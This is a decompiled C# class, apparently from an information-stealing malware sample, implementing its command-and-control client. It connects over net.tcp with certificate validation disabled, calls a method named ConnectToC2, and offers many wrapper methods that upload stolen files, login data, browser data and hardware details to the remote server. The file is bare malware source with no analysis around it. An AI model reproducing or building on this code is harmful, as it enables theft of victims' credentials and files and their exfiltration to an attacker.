using System;
using System.Collections.Generic;
using System.Reflection;
using System.ServiceModel;
using System.ServiceModel.Channels;
using System.ServiceModel.Security;

// Token: 0x02000009 RID: 9
[Obfuscation(Exclude = true, StripAfterObfuscation = true)]
public class ConnectionProvider
{
	// Token: 0x0600002D RID: 45 RVA: 0x000044DC File Offset: 0x000028DC
	public bool Id1(string address, string auth)
	{
		return this.RequestConnection(address, auth) && this.SendLogByFull();
	}

	// Token: 0x0600002E RID: 46 RVA: 0x00004500 File Offset: 0x00002900
	[Obfuscation(ApplyToMembers = true, Exclude = true, StripAfterObfuscation = true)]
	public bool RequestConnection(string address, string auth)
	{
		bool result;
		try
		{
			IContextChannel contextChannel = new ChannelFactory<Entity>(SystemInfoHelper.CreateBind(), new EndpointAddress(new Uri("net.tcp://" + address + "/"), EndpointIdentity.CreateDnsIdentity("localhost"), new AddressHeader[0]))
			{
				Credentials = 
				{
					ServiceCertificate = 
					{
						Authentication = 
						{
							CertificateValidationMode = X509CertificateValidationMode.None
						}
					}
				}
			}.CreateChannel() as IContextChannel;
			this.connector = (contextChannel as Entity);
			OperationContextScope operationContextScope = new OperationContextScope(contextChannel);
			string value = auth;
			MessageHeader header = MessageHeader.CreateHeader("Authorization", "ns1", value);
			OperationContext.Current.OutgoingMessageHeaders.Add(header);
			result = true;
		}
		catch (Exception ex)
		{
			result = false;
		}
		return result;
	}
	public bool SendLogByFull()
	{
		bool result;
		try
		{
			result = this.connector.ConnectToC2();
		}
		catch (Exception ex)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x06000030 RID: 48 RVA: 0x000045F8 File Offset: 0x000029F8
	public bool Id4(Entity_CollectedResults result)
	{
		bool result2;
		try
		{
			this.connector.Id3(result);
			result2 = true;
		}
		catch (Exception ex)
		{
			result2 = false;
		}
		return result2;
	}

	// Token: 0x06000031 RID: 49 RVA: 0x00004630 File Offset: 0x00002A30
	public bool Id5(out Entity_Settings args)
	{
		bool result;
		try
		{
			args = new Entity_Settings();
			args = this.connector.Id2();
			result = true;
		}
		catch (Exception ex)
		{
			args = new Entity_Settings();
			result = false;
		}
		return result;
	}

	// Token: 0x06000032 RID: 50 RVA: 0x00004678 File Offset: 0x00002A78
	public Entity_ServerResponse Id6(Entity_CollectedResults result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id4(result);
		}
		catch (Exception ex)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000033 RID: 51 RVA: 0x000046B0 File Offset: 0x00002AB0
	public Entity_ServerResponse Id7(byte[] result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id5(result);
		}
		catch (Exception ex)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000034 RID: 52 RVA: 0x000046E8 File Offset: 0x00002AE8
	public Entity_ServerResponse Id8(List<Entity_Browser> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id11(result);
		}
		catch (Exception ex)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000035 RID: 53 RVA: 0x00004720 File Offset: 0x00002B20
	public Entity_ServerResponse Id9(List<Entity_StolenFile> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id15(result);
		}
		catch (Exception ex)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000036 RID: 54 RVA: 0x00004758 File Offset: 0x00002B58
	public Entity_ServerResponse Id10(List<string> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id6(result);
		}
		catch (Exception ex)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000037 RID: 55 RVA: 0x00004790 File Offset: 0x00002B90
	public Entity_ServerResponse Id11(List<Entity_StolenFile> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id21(result);
		}
		catch (Exception ex)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000038 RID: 56 RVA: 0x000047C8 File Offset: 0x00002BC8
	public Entity_ServerResponse Id12(List<Entity_LoginData> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id12(result);
		}
		catch (Exception ex)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000039 RID: 57 RVA: 0x00004800 File Offset: 0x00002C00
	public Entity_ServerResponse Id13(List<Entity_HardwareInfo> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id10(result);
		}
		catch (Exception ex)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x0600003A RID: 58 RVA: 0x00004838 File Offset: 0x00002C38
	public Entity_ServerResponse Id14(List<BrowserInfo> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id13(result);
		}
		catch (Exception ex)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x0600003B RID: 59 RVA: 0x00004870 File Offset: 0x00002C70
	public Entity_ServerResponse Id15(List<string> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id8(result);
		}
		catch (Exception ex)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x0600003C RID: 60 RVA: 0x000048A8 File Offset: 0x00002CA8
	public Entity_ServerResponse Id16(List<string> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id7(result);
		}
		catch (Exception ex)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x0600003D RID: 61 RVA: 0x000048E0 File Offset: 0x00002CE0
	public Entity_ServerResponse Id18(List<Entity_LoginData> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id17(result);
		}
		catch (Exception ex)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x0600003E RID: 62 RVA: 0x00004918 File Offset: 0x00002D18
	public Entity_ServerResponse Id19(List<Entity_StolenFile> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id18(result);
		}
		catch (Exception ex)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x0600003F RID: 63 RVA: 0x00004950 File Offset: 0x00002D50
	public Entity_ServerResponse Id20(List<string> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id9(result);
		}
		catch (Exception ex)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000040 RID: 64 RVA: 0x00004988 File Offset: 0x00002D88
	public Entity_ServerResponse Id21(List<Entity_StolenFile> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id19(result);
		}
		catch (Exception ex)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000041 RID: 65 RVA: 0x000049C0 File Offset: 0x00002DC0
	public Entity_ServerResponse Id22(List<Entity_StolenFile> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id14(result);
		}
		catch (Exception ex)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000042 RID: 66 RVA: 0x000049F8 File Offset: 0x00002DF8
	public Entity_ServerResponse Id23(List<Entity_StolenFile> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id16(result);
		}
		catch (Exception ex)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000043 RID: 67 RVA: 0x00004A30 File Offset: 0x00002E30
	public Entity_ServerResponse Id24(List<Entity_StolenFile> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id20(result);
		}
		catch (Exception ex)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000044 RID: 68 RVA: 0x00004A68 File Offset: 0x00002E68
	public bool Id25()
	{
		bool result;
		try
		{
			this.connector.Id22();
			result = true;
		}
		catch (Exception ex)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x04000002 RID: 2
	public Entity connector;
}
